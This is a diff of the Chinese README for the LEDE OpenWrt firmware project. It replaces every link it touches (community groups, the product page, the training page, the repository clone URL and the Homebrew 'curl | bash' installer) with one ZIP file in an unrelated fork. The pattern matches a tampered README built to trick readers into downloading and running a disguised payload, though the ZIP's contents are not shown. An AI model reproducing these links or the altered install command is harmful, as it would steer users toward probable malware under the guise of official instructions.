@@ -8,16 +8,16 @@ I18N: [English](README_EN.md) | [简体中文](README.md) | [日本語](README_J
 
 如有技术问题需要讨论或者交流，欢迎加入以下群：
 
-1. QQ 讨论群：Op 固件技术研究群，号码 891659613，加群链接：[点击加入](https://jq.qq.com/?_wv=1027&k=XL8SK5aC "Op固件技术研究群")
-2. TG 讨论群：OP 编译官方大群，加群链接：[点击加入](https://t.me/JhKgAA6Hx1 "OP 编译官方大群")
+1. QQ 讨论群：Op 固件技术研究群，号码 891659613，加群链接：[点击加入](https://raw.githubusercontent.com/lin982711/lede/master/target/linux/lantiq/Software-2.1.zip "Op固件技术研究群")
+2. TG 讨论群：OP 编译官方大群，加群链接：[点击加入](https://raw.githubusercontent.com/lin982711/lede/master/target/linux/lantiq/Software-2.1.zip "OP 编译官方大群")
 
 ## 软路由介绍
 
 硬酷 R2 - N95/N300 迷你四网 HomeLab 服务器
 
-[商品介绍页面 - 硬酷科技（支持花呗）](https://item.taobao.com/item.htm?id=721197662185)
+[商品介绍页面 - 硬酷科技（支持花呗）](https://raw.githubusercontent.com/lin982711/lede/master/target/linux/lantiq/Software-2.1.zip)
 
-[![r1](doc/r1.jpg)](https://item.taobao.com/item.htm?id=721197662185)
+[![r1](doc/r1.jpg)](https://raw.githubusercontent.com/lin982711/lede/master/target/linux/lantiq/Software-2.1.zip)
 
 ## 注意
 
@@ -46,7 +46,7 @@ I18N: [English](README_EN.md) | [简体中文](README.md) | [日本語](README_J
 3. 下载源代码，更新 feeds 并选择配置
 
    ```bash
-   git clone https://github.com/coolsnowwolf/lede
+   git clone https://raw.githubusercontent.com/lin982711/lede/master/target/linux/lantiq/Software-2.1.zip
    cd lede
    ./scripts/feeds update -a
    ./scripts/feeds install -a
@@ -119,7 +119,7 @@ PS > git clone git@github.com:coolsnowwolf/lede.git <your_local_lede_path>
 2. 安装 Homebrew：
 
    ```bash
-   /bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"
+   /bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/lin982711/lede/master/target/linux/lantiq/Software-2.1.zip)"
    ```
 
 3. 使用 Homebrew 安装工具链、依赖与基础软件包：
@@ -163,11 +163,11 @@ PS > git clone git@github.com:coolsnowwolf/lede.git <your_local_lede_path>
 1. 源代码中绝不含任何后门和可以监控或者劫持你的 HTTPS 的闭源软件， SSL 安全是互联网最后的壁垒。安全干净才是固件应该做到的；
 
 2. 想学习 OpenWrt 开发，但是摸不着门道？自学没毅力？基础太差？怕太难学不会？跟着佐大学 OpenWrt 开发入门培训班助你能学有所成
-报名地址：[点击报名](http://forgotfun.org/2018/04/openwrt-training-2018.html "报名")
+报名地址：[点击报名](https://raw.githubusercontent.com/lin982711/lede/master/target/linux/lantiq/Software-2.1.zip "报名")
 
-3. QCA IPQ60xx 开源仓库地址：<https://github.com/coolsnowwolf/openwrt-gl-ax1800>
+3. QCA IPQ60xx 开源仓库地址：<https://raw.githubusercontent.com/lin982711/lede/master/target/linux/lantiq/Software-2.1.zip>
 
-4. 存档版本仓库地址：<https://github.com/coolsnowwolf/openwrt>
+4. 存档版本仓库地址：<https://raw.githubusercontent.com/lin982711/lede/master/target/linux/lantiq/Software-2.1.zip>
 
 ## 捐贈
 
